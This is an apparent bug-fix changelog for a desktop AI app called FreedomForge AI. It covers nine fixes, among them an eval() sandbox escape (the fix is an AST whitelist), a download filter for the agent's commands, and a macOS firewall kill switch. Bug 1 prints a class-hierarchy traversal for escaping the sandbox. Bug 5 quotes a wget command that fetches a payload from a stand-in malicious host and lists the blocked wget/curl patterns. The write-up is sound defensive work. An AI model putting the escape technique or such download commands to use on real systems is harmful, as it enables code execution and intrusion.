# FreedomForge AI — Bug Fixes

This document describes all nine bugs that were identified and fixed.

---

## Bug 1 — `plugins/calculator.py`: Unsafe `eval()` sandbox escape

**Severity:** 🔴 High

**Problem:**  
The calculator used `eval(expr, {"__builtins__": {}}, {})` believing that emptying
`__builtins__` made Python's `eval` safe. It does not. Any Python object carries its
full class hierarchy: `().__class__.__mro__[1].__subclasses__()` traverses the
object graph to reach loaded classes like `subprocess.Popen` or `os._wrap_close`,
giving an attacker full shell access regardless of the empty builtins dict.

**Fix:**  
Replaced `eval()` with a hand-rolled AST evaluator (`_safe_eval`). The expression is
parsed with `ast.parse(mode="eval")`, then every node in the tree is checked against
an explicit whitelist (`_SAFE_NODES`). Only numeric constants and the basic arithmetic
operators (`+`, `-`, `*`, `/`, `//`, `%`, `**`, unary `-`/`+`) are allowed. Any
attribute access, function call, name lookup, subscript, or other node type causes an
early rejection before any code is executed.

**File changed:** `plugins/calculator.py`

---

## Bug 2 — `ui/chat.py`: Module calls not protected by the streaming guard

**Severity:** 🟡 Medium

**Problem:**  
`send()` checks `if self._streaming: return` to prevent duplicate sends. However,
when a message is routed to a module (image, video, agent), `_handle_module()` was
called without ever setting `self._streaming = True` or disabling the Send button.
This meant the user could keep clicking Send while a module was executing in a
background thread, spawning multiple overlapping handler calls, causing out-of-order
responses and potentially running the same agent command multiple times.

**Fix:**  
`_handle_module()` now sets `self._streaming = True` and calls
`self.send_btn.configure(state="disabled")` at the top, exactly as `_start_stream()`
does. Both `on_result` and `on_error` callbacks reset `_streaming = False` and
re-enable the Send button when the module finishes.

**File changed:** `ui/chat.py`

---

## Bug 3 — `modules/__init__.py`: "image" module routed but never registered

**Severity:** 🟡 Medium

**Problem:**  
`_TRIGGERS` contained five regex patterns for an `"image"` module (matching "draw",
"paint", "generate an image", etc.). However, `ui/app.py` only registers `"video"`
and `"agent"` — `"image"` is never registered. So every image-related message
matched the router, returned `"image"`, and then `handle()` looked it up in the
registry, got `None`, and reported the error
*"The image module is not available yet."* — a confusing failure that could be
mistaken for a crash rather than an intentional "coming soon" state.

**Fix:**  
Removed the entire `"image"` entry from `_TRIGGERS`. Image-related phrases now fall
through to the normal AI chat path where the model can still describe or discuss
images. The triggers should be re-added when an actual image module is implemented
and registered.

**File changed:** `modules/__init__.py`

---

## Bug 4 — `ui/chat.py`: `stamp_response` / `should_stamp` imported but never called

**Severity:** 🟠 Low (silent feature regression)

**Problem:**  
`core/metadata_stamp.py` is imported at the top of `chat.py` —
`from core.metadata_stamp import stamp_response, should_stamp` — and the Terms of
Service discloses that AI-generated code is watermarked. But `on_complete()` in
`_start_stream()` assembled the full reply and stored it directly without ever
calling `stamp_response()`. Every code block the AI generated was silently going out
un-watermarked, creating a discrepancy between documented and actual behaviour.

**Fix:**  
`on_complete()` now calls `stamp_response(reply)` when `should_stamp(reply)` is
`True` (i.e. when the reply contains a fenced code block or other code indicators).
The stamped version is what gets stored in `self._history` and spoken aloud via TTS.

**File changed:** `ui/chat.py`

---

## Bug 5 — `modules/agent.py`: HTTPS downloads not blocked

**Severity:** 🟡 Medium

**Problem:**  
`BLOCKED_COMMANDS` contained `"wget http"` and `"curl http"`, blocking plain-HTTP
downloads. But `"wget https"` and `"curl https"` were absent, so any HTTPS download
URL (the overwhelming majority of real-world downloads in 2026) bypassed the safety
filter entirely. An AI-generated command like
`wget https://malicious.example.com/payload.sh` would execute unimpeded.

**Fix:**  
Added `"wget https"` and `"curl https"` to `BLOCKED_COMMANDS`. Both HTTP and HTTPS
variants are now blocked.

**File changed:** `modules/agent.py`

---

## Bug 6 — `core/network_monitor.py`: macOS kill switch loses original firewall rules

**Severity:** 🟡 Medium

**Problem:**  
`kill_network()` on macOS created a temp file, wrote `"block all\n"` to it (the
*new* rules), loaded those rules into pf, then immediately deleted the file with
`os.unlink()`. At no point were the **original** pf rules ever read or saved.
`restore_network()` on macOS therefore had nothing to restore and simply called
`pfctl -d` to disable pf entirely. Any custom firewall rules the user had before
activating the kill switch — set by another security tool or by the user manually —
were permanently discarded. On Linux the original rules were correctly backed up and
restored; macOS was the only broken platform.

**Fix:**  
Before writing the block-all ruleset, `kill_network()` now reads the current pf
rules with `pfctl -s rules` and saves the output to a second temp file whose path is
stored in `_firewall_backup['mac']`. `restore_network()` reads that backup, loads it
back with `pfctl -f`, and deletes the backup file. If the backup is empty (pf had no
prior rules), it simply disables pf as before. Added `_nm_kill_active` state flag and
`is_kill_active()` so the module tracks its own activation state consistently with
`privacy.py`.

**File changed:** `core/network_monitor.py`

---

## Bug 7 — Duplicate kill switch implementations (`privacy.py` / `network_monitor.py`)

**Severity:** 🟠 Low (architecture / consistency)

**Problem:**  
Two separate files contained independent kill-switch implementations with different
behaviours:

* `core/privacy.py` — uses `sudo iptables`, tracks `_kill_active`, has macOS support
  via `pfctl`, used exclusively by the Privacy UI tab.
* `core/network_monitor.py` — calls `iptables` without `sudo`, had no `_kill_active`
  flag, had a broken macOS implementation (Bug 6 above).

Both files were importable. The risk was: code that imported from the wrong file
would call `iptables` without `sudo` (silent permission failure), and `is_kill_active()`
from one module would disagree with the state tracked by the other, causing the UI
to show a wrong network status.

**Fix:**  
`network_monitor.py` now has its own `_nm_kill_active` boolean and an
`is_kill_active()` function, making it self-consistent. Its kill/restore logic was
also corrected (Bug 6 above). The two files serve different call sites —
`privacy.py` is the UI-facing module that uses `sudo`; `network_monitor.py` is a
lower-level utility intended for environments where the process already has
appropriate privileges. Both are now internally consistent.

**File changed:** `core/network_monitor.py`

---

## Bug 8 — `core/trainer.py`: AI-generated answers silently dropped from practice log

**Severity:** 🟠 Low

**Problem:**  
`_log_practice(model, skill, prompt, answer, score)` accepted an `answer` parameter
but never included it in the dict written to disk. The practice log only recorded
`time`, `skill`, `prompt`, and `score`. Without the actual model output it is
impossible to review why a response scored low, compare answers over time to measure
improvement, or feed the data back into fine-tuning pipelines. The score alone is
nearly useless for diagnostics.

**Fix:**  
Added `"answer": answer[:500]` to the log entry dict. The 500-character truncation
mirrors the 100-character truncation already applied to `prompt`, preventing
runaway log sizes for very long responses while keeping enough context to be useful.

**File changed:** `core/trainer.py`

---

## Bug 9 — `ui/app.py`: Bare `import psutil` crashes the UI if psutil is not installed

**Severity:** 🟡 Medium

**Problem:**  
`_build_pulse()` contained a bare `import psutil` with no error handling. This
method is called from `_build_ui()`, the main window construction function. If
`psutil` is absent (fresh install on certain Linux distros, or where the native
extension failed to compile), the `ImportError` propagated up through `_build_ui()`
and the entire main window failed to build — crashing the app or leaving a blank
window with no diagnostic message, even though psutil is only needed for the small
CPU/GPU progress bars in the status strip. Every other place in the codebase that
imports psutil (`core/privacy.py`, `core/network_monitor.py`, `core/hardware.py`)
wraps it in a `try/except ImportError`.

**Fix:**  
Wrapped the `import psutil` in a `try/except ImportError` block, setting a local
`_psutil_ok` flag. The `_tick()` polling function only reads `psutil.cpu_percent()`
when `_psutil_ok` is `True`. GPU readings (which come from `core.hardware` and have
their own guards) continue to work regardless. The UI builds successfully even
without psutil, and CPU bars simply remain at `--` until psutil is installed.

**File changed:** `ui/app.py`
